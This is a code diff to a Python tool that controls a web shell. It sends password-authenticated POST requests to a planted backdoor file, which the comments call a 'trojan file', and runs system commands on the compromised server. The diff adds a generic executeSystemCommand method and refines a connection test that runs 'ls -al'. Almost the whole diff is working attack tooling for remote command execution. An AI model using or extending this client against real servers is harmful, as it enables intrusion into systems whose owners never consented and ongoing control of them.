@@ -1,5 +1,4 @@
 import requests
-import warnings
 from requests.exceptions import RequestException
 import re
 import Backdoor_class
@@ -31,31 +30,65 @@ class superTools:
         self.backdoor.setanalyzeUrl()
         self.backdoor.setPassword(password)
         self.backdoor.printALLAttribute()
+        print("\n" * 3)
 
-    def testUrl(self, timeoutvalue=2):
+    def testUrl(self, timeoutValue: int = 2) -> None:
+        """
+        测试 URL 连接并执行系统命令。
+
+        该方法用于测试 URL 连接是否成功，并执行预定义的系统命令。方法将发送 POST 请求，
+        并检查响应状态码和响应内容以确定连接是否成功，以及系统命令是否执行成功。
+
+        Args:
+            timeoutValue (int): 连接超时时间，单位为秒。默认为 2 秒。
+
+        Returns:
+            None
+
+        Example:
+            示例用法:
+            - 调用 `testUrl()` 方法来测试 URL 连接和执行系统命令。
+        """
         try:
             self.backdoor.setSystemCmd_PostValue("ls -al")
-            # 发送HTTP请求，设置连接超时为2秒
+            # 发送HTTP请求，设置连接超时为指定时间
             response = requests.post(
-                self.backdoor.Url, data=self.backdoor.post_data, timeout=timeoutvalue)
+                self.backdoor.Url, data=self.backdoor.post_data, timeout=timeoutValue)
 
             # 检查响应状态码
             if response.status_code != 200:
                 print("连接失败")
             print('---------------------响应---------------------')
             print(response.text)
-            print('----------------------------------------------')
             if not response.text:
-                print("密码错误")
-            if '..' in response.text:
-                # 自动检测时响应中包含 ".."则代表成功,否则命令执行失败
-                print("连接成功")
+                print('------------------密码错误-------------------')
+            if self.backdoor.file_name in response.text:
+                # 自动检测时响应中包含连接文件则代表成功，否则失败
+                print('------------------连接成功-------------------')
             else:
-                print("自行检查是否成功")
+                print('--------------自行检查是否成功---------------')
 
         # 错误响应
         except RequestException as e:
             if "timeout" in str(e):
-                print("连接失败: 失败原因连接时间过长")
+                print("连接失败: 失败原因连接时间过长，可能不存在该木马文件")
             else:
                 print("连接失败:", str(e))
+
+    def executeSystemCommand(self, systemCmd, timeoutValue: int = 2) -> None:
+        try:
+            self.backdoor.setSystemCmd_PostValue(systemCmd)
+            # 发送HTTP请求，设置连接超时为指定时间
+            response = requests.post(
+                self.backdoor.Url, data=self.backdoor.post_data, timeout=timeoutValue)
+            # 检查响应状态码
+            if response.status_code != 200:
+                print("连接失败")
+            print('---------------------响应---------------------')
+            print(response.text)
+            print('----------------------------------------------')
+        except RequestException as e:
+            if "timeout" in str(e):
+                print("执行失败: 失败原因连接时间过长")
+            else:
+                print("执行失败:", str(e))
